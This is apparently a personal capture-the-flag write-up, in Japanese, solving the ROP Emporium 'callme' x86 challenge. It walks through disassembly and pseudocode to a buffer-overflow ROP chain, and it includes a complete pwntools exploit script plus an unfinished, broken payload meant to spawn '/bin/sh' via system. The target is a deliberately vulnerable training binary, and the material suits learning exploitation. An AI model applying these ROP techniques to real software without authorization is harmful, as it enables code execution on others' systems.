# callme x86

## Description



## Solution

#### 表層解析

```
✦ ❯ checksec --file=callme32 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   75) Symbols	  No	0		3	callme32
```

canaryがないのでstackベースのexploitができそう。

```
0804a03c B __bss_start
         U callme_one
         U callme_three
         U callme_two
0804a040 b completed.7283
0804a034 D __data_start
0804a034 W data_start
080485d0 t deregister_tm_clones
080485b0 T _dl_relocate_static_pie
08048650 t __do_global_dtors_aux
08049f00 d __do_global_dtors_aux_fini_array_entry
0804a038 D __dso_handle
08049f04 d _DYNAMIC
0804a03c D _edata
0804a044 B _end
         U exit@@GLIBC_2.0
08048804 T _fini
08048818 R _fp_hw
08048680 t frame_dummy
08049efc d __frame_dummy_init_array_entry
080489f4 r __FRAME_END__
0804a000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
0804887c r __GNU_EH_FRAME_HDR
0804848c T _init
08049f00 d __init_array_end
08049efc d __init_array_start
0804881c R _IO_stdin_used
08048800 T __libc_csu_fini
080487a0 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
08048686 T main
         U memset@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
080486ed t pwnme
         U read@@GLIBC_2.0
08048610 t register_tm_clones
         U setvbuf@@GLIBC_2.0
08048570 T _start
0804a03c B stdout@@GLIBC_2.0
0804a03c D __TMC_END__
0804874f t usefulFunction
080485c0 T __x86.get_pc_thunk.bx
```

```
✦ ❯ rabin2 -i callme32 
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x080484c0 GLOBAL FUNC       read
2   0x080484d0 GLOBAL FUNC       printf
3   0x080484e0 GLOBAL FUNC       callme_three
4   0x080484f0 GLOBAL FUNC       callme_one
5   0x08048500 GLOBAL FUNC       puts
6   0x00000560 WEAK   NOTYPE     __gmon_start__
7   0x08048510 GLOBAL FUNC       exit
8   0x08048520 GLOBAL FUNC       __libc_start_main
9   0x08048530 GLOBAL FUNC       setvbuf
10  0x08048540 GLOBAL FUNC       memset
11  0x08048550 GLOBAL FUNC       callme_two
```

```
080484e0 <callme_three@plt>:
 80484e0:       ff 25 14 a0 04 08       jmp    DWORD PTR ds:0x804a014
 80484e6:       68 10 00 00 00          push   0x10
 80484eb:       e9 c0 ff ff ff          jmp    80484b0 <.plt>

080484f0 <callme_one@plt>:
 80484f0:       ff 25 18 a0 04 08       jmp    DWORD PTR ds:0x804a018
 80484f6:       68 18 00 00 00          push   0x18
 80484fb:       e9 b0 ff ff ff          jmp    80484b0 <.plt>
 08048550 <callme_two@plt>:
 8048550:       ff 25 30 a0 04 08       jmp    DWORD PTR ds:0x804a030
 8048556:       68 48 00 00 00          push   0x48
 804855b:       e9 50 ff ff ff          jmp    80484b0 <.plt>

```



```
gef➤  disas 
Dump of assembler code for function pwnme:
   0x080486ed <+0>:	push   ebp
   0x080486ee <+1>:	mov    ebp,esp
   0x080486f0 <+3>:	sub    esp,0x28
=> 0x080486f3 <+6>:	sub    esp,0x4
   0x080486f6 <+9>:	push   0x20
   0x080486f8 <+11>:	push   0x0
   0x080486fa <+13>:	lea    eax,[ebp-0x28]
   0x080486fd <+16>:	push   eax
   0x080486fe <+17>:	call   0x8048540 <memset@plt>
   0x08048703 <+22>:	add    esp,0x10
   0x08048706 <+25>:	sub    esp,0xc
   0x08048709 <+28>:	push   0x8048848
   0x0804870e <+33>:	call   0x8048500 <puts@plt>
   0x08048713 <+38>:	add    esp,0x10
   0x08048716 <+41>:	sub    esp,0xc
   0x08048719 <+44>:	push   0x804886b
   0x0804871e <+49>:	call   0x80484d0 <printf@plt>
   0x08048723 <+54>:	add    esp,0x10
   0x08048726 <+57>:	sub    esp,0x4
   0x08048729 <+60>:	push   0x200
   0x0804872e <+65>:	lea    eax,[ebp-0x28]
   0x08048731 <+68>:	push   eax
   0x08048732 <+69>:	push   0x0
   0x08048734 <+71>:	call   0x80484c0 <read@plt>
   0x08048739 <+76>:	add    esp,0x10
   0x0804873c <+79>:	sub    esp,0xc
   0x0804873f <+82>:	push   0x804886e
   0x08048744 <+87>:	call   0x8048500 <puts@plt>
   0x08048749 <+92>:	add    esp,0x10
   0x0804874c <+95>:	nop
   0x0804874d <+96>:	leave  
   0x0804874e <+97>:	ret 
```



call one,call two,call threeがあやしい。

usefulFunctionもなんか怪しい。

まぁとりあえず今までと同じようにpwnmeに脆弱性があるので見てあげようか

### 解析



```
❯ ./callme32 
callme by ROP Emporium
x86

Hope you read the instructions...

> hello
Thank you!

Exiting
```

```read(0,ebp-0x28,0x200)```ぽいので適当に44文字入力してuseFulFunctionのアドレスを入力する

```
❯ python2 -c "print 'A' * 44 +  '\x4f\x87\x04\x08'" | ./callme32
callme by ROP Emporium
x86

Hope you read the instructions...

> Thank you!
Incorrect parameters

```



なんか引数を要求されたぜ....

とりあえずuseFulFunctionをしっかり見ていくか

```
0804874f <usefulFunction>:
 804874f:       55                      push   ebp
 8048750:       89 e5                   mov    ebp,esp
 8048752:       83 ec 08                sub    esp,0x8
 8048755:       83 ec 04                sub    esp,0x4
 8048758:       6a 06                   push   0x6
 804875a:       6a 05                   push   0x5
 804875c:       6a 04                   push   0x4
 804875e:       e8 7d fd ff ff          call   80484e0 <callme_three@plt>
 8048763:       83 c4 10                add    esp,0x10
 8048766:       83 ec 04                sub    esp,0x4
 8048769:       6a 06                   push   0x6
 804876b:       6a 05                   push   0x5
 804876d:       6a 04                   push   0x4
 804876f:       e8 dc fd ff ff          call   8048550 <callme_two@plt>
 8048774:       83 c4 10                add    esp,0x10
 8048777:       83 ec 04                sub    esp,0x4
 804877a:       6a 06                   push   0x6
 804877c:       6a 05                   push   0x5
 804877e:       6a 04                   push   0x4
 8048780:       e8 6b fd ff ff          call   80484f0 <callme_one@plt>
 8048785:       83 c4 10                add    esp,0x10
 8048788:       83 ec 0c                sub    esp,0xc
 804878b:       6a 01                   push   0x1
 804878d:       e8 7e fd ff ff          call   8048510 <exit@plt>
 8048792:       66 90                   xchg   ax,ax
 8048794:       66 90                   xchg   ax,ax
 8048796:       66 90                   xchg   ax,ax
 8048798:       66 90                   xchg   ax,ax
 804879a:       66 90                   xchg   ax,ax
 804879c:       66 90                   xchg   ax,ax
 804879e:       66 90                   xchg   ax,ax
```

usefulFunctionを擬似コードで書くと以下のようになっている。

```
usefulFunction(){
	callme_three(4,5,6);
	callme_two(4,5,6);
	callme_one(4,5,6);
	exit();
}
```

callme_oneを動かしたいなぁ

```
gef➤  disas callme_one
Dump of assembler code for function callme_one:
   0xf7fc263d <+0>:	push   ebp
   0xf7fc263e <+1>:	mov    ebp,esp
   0xf7fc2640 <+3>:	push   ebx
   0xf7fc2641 <+4>:	sub    esp,0x14
   0xf7fc2644 <+7>:	call   0xf7fc2540 <__x86.get_pc_thunk.bx>
   0xf7fc2649 <+12>:	add    ebx,0x19b7
   0xf7fc264f <+18>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0xf7fc2656 <+25>:	jne    0xf7fc2733 <callme_one+246>
   0xf7fc265c <+31>:	cmp    DWORD PTR [ebp+0xc],0xcafebabe
   0xf7fc2663 <+38>:	jne    0xf7fc2733 <callme_one+246>
   0xf7fc2669 <+44>:	cmp    DWORD PTR [ebp+0x10],0xd00df00d
   0xf7fc2670 <+51>:	jne    0xf7fc2733 <callme_one+246>
   0xf7fc2676 <+57>:	mov    DWORD PTR [ebp-0xc],0x0
   0xf7fc267d <+64>:	sub    esp,0x8
   0xf7fc2680 <+67>:	lea    eax,[ebx-0x1600]
   0xf7fc2686 <+73>:	push   eax
   0xf7fc2687 <+74>:	lea    eax,[ebx-0x15fe]
   0xf7fc268d <+80>:	push   eax
   0xf7fc268e <+81>:	call   0xf7fc2510 <fopen@plt>
   0xf7fc2693 <+86>:	add    esp,0x10
   0xf7fc2696 <+89>:	mov    DWORD PTR [ebp-0xc],eax
   0xf7fc2699 <+92>:	cmp    DWORD PTR [ebp-0xc],0x0
   0xf7fc269d <+96>:	jne    0xf7fc26bb <callme_one+126>
   0xf7fc269f <+98>:	sub    esp,0xc
   0xf7fc26a2 <+101>:	lea    eax,[ebx-0x15e8]
   0xf7fc26a8 <+107>:	push   eax
   0xf7fc26a9 <+108>:	call   0xf7fc24f0 <puts@plt>
   0xf7fc26ae <+113>:	add    esp,0x10
   0xf7fc26b1 <+116>:	sub    esp,0xc
   0xf7fc26b4 <+119>:	push   0x1
   0xf7fc26b6 <+121>:	call   0xf7fc2500 <exit@plt>
   0xf7fc26bb <+126>:	sub    esp,0xc
   0xf7fc26be <+129>:	push   0x21
   0xf7fc26c0 <+131>:	call   0xf7fc24e0 <malloc@plt>
   0xf7fc26c5 <+136>:	add    esp,0x10
   0xf7fc26c8 <+139>:	mov    DWORD PTR [ebx+0x30],eax
   0xf7fc26ce <+145>:	mov    eax,DWORD PTR [ebx+0x30]
   0xf7fc26d4 <+151>:	test   eax,eax
   0xf7fc26d6 <+153>:	jne    0xf7fc26f4 <callme_one+183>
   0xf7fc26d8 <+155>:	sub    esp,0xc
   0xf7fc26db <+158>:	lea    eax,[ebx-0x15c6]
   0xf7fc26e1 <+164>:	push   eax
   0xf7fc26e2 <+165>:	call   0xf7fc24f0 <puts@plt>
   0xf7fc26e7 <+170>:	add    esp,0x10
   0xf7fc26ea <+173>:	sub    esp,0xc
   0xf7fc26ed <+176>:	push   0x1
   0xf7fc26ef <+178>:	call   0xf7fc2500 <exit@plt>
   0xf7fc26f4 <+183>:	mov    eax,DWORD PTR [ebx+0x30]
   0xf7fc26fa <+189>:	sub    esp,0x4
   0xf7fc26fd <+192>:	push   DWORD PTR [ebp-0xc]
   0xf7fc2700 <+195>:	push   0x21
   0xf7fc2702 <+197>:	push   eax
   0xf7fc2703 <+198>:	call   0xf7fc24c0 <fgets@plt>
   0xf7fc2708 <+203>:	add    esp,0x10
   0xf7fc270b <+206>:	mov    DWORD PTR [ebx+0x30],eax
   0xf7fc2711 <+212>:	sub    esp,0xc
   0xf7fc2714 <+215>:	push   DWORD PTR [ebp-0xc]
   0xf7fc2717 <+218>:	call   0xf7fc24d0 <fclose@plt>
   0xf7fc271c <+223>:	add    esp,0x10
   0xf7fc271f <+226>:	sub    esp,0xc
   0xf7fc2722 <+229>:	lea    eax,[ebx-0x15ac]
   0xf7fc2728 <+235>:	push   eax
   0xf7fc2729 <+236>:	call   0xf7fc24f0 <puts@plt>
   0xf7fc272e <+241>:	add    esp,0x10
   0xf7fc2731 <+244>:	jmp    0xf7fc274f <callme_one+274>
   0xf7fc2733 <+246>:	sub    esp,0xc
   0xf7fc2736 <+249>:	lea    eax,[ebx-0x158e]
   0xf7fc273c <+255>:	push   eax
   0xf7fc273d <+256>:	call   0xf7fc24f0 <puts@plt>
   0xf7fc2742 <+261>:	add    esp,0x10
   0xf7fc2745 <+264>:	sub    esp,0xc
   0xf7fc2748 <+267>:	push   0x1
   0xf7fc274a <+269>:	call   0xf7fc2500 <exit@plt>
   0xf7fc274f <+274>:	nop
   0xf7fc2750 <+275>:	mov    ebx,DWORD PTR [ebp-0x4]
   0xf7fc2753 <+278>:	leave  
   0xf7fc2754 <+279>:	ret  
   
```

callme_oneの疑似コードを以下に載せる

```
callme_one(ebp+0x8(a),ebp+0xc(b),ebp+0x10(c)){
	if(a == 0xdeadbeef && b == 0xcafebabe && c == 0xd00df00d){
		enc = fopen("encrypted_flag.dat","r")
		if(enc != 0){
			//読み込めた場合
			mallocated = malloc(0x21)
			if(mallocated != 0){
				fgets(mallocated,0x21,ebp-0xc);
				fclose();
				puts("callme_one() called correctly");
			}else{
				puts()
			}
		}
	}else{
		puts("Incorrect parameters")
	}
	exit()
}
```



うーんとりあえずebxが何してるかわからないから

a,b,cの比較を突破してやるか

|  アドレス  |           内容            |
| :--------: | :-----------------------: |
|  esp - >   |            ...            |
| ebp - 0x28 |           AAAA            |
|   ebp ->   |           AAAA            |
| ebp + 0x4  |     saved ebp() AAAA      |
| ebp + 0x8  | return address callme_one |
| ebp + 0xc  |           BBBB            |
| ebp + 0x10 |        0xdeadbeef         |
| ebp + 0x14 |        0xcafebabe         |
| ebp + 0x18 |        0xd00df00d         |



```
❯ python3 mysolve.py
[*] '/mnt/nvme0n1p7/security/rop-emporium/callme32/callme32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
[+] Starting local process './callme32': pid 83546
[+] ROPchain = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf0\x84\x04\x08BBBB\xef\xbe\xad\xde\xbe\xba\xfe\xca\r\xf0\r\xd0'
[+] Receiving all data: Done (106B)
[*] Process './callme32' stopped with exit code -11 (SIGSEGV) (pid 83546)
[b'callme by ROP Emporium', b'x86', b'', b'Hope you read the instructions...', b'', b'> Thank you!', b'callme_one() called correctly', b'']

```

にゃぁぁん。callme_one()がいい感じに通り抜けたから何って感じだァァ

callme_twoとcallme_threeも似たような感じなので、

全部通してみるか。

全部通すためにropgadgetを使ってそれぞれの引数分をpopして、一番上にfuncのアドレスを持ってくれば

いい感じに通せる

```
 10% ❯ cat input |  callme32
callme by ROP Emporium
x86

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{C4ll1ng_w1th_params_1n_x86}
```

## まとめ

![image-20211216235319227](/home/mizuiro/.config/Typora/typora-user-images/image-20211216235319227.png)

ちゃんと問題文は読みましょう



## solver

```
from platform import system
from pwn import *

BINARY = "./callme32"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "i386"
context.binary = BINARY

p = process(BINARY)

def payload_1():
    rop = b"A" * 44
    for func in ['callme_one', 'callme_two', 'callme_three']:
        rop += p32(ELF.symbols[func])
        rop += p32(0x080487f9) # pop 3 times ret;
        rop += p32(0xdeadbeef)
        rop += p32(0xcafebabe)
        rop += p32(0xd00df00d) 
    return rop

def payload_2():
    rop = b"A" * 44
    rop += p32(ELF.symbols[system])
    rop += b"BBBB"
    rop += b"/bin/sh\x00"

PAYLOAD = 1
SLICE = 2
rop = payload_1()

if PAYLOAD == 2:
    rop = payload_2()
    SLICE = 6



log.success(f"ROPchain = {rop}")
p.sendline(rop)
flag = p.recvall().split(b'\n')[-SLICE]
log.success(f"FLAG : {flag}")

with open('./input', mode='wb') as f:
    f.write(rop)

```

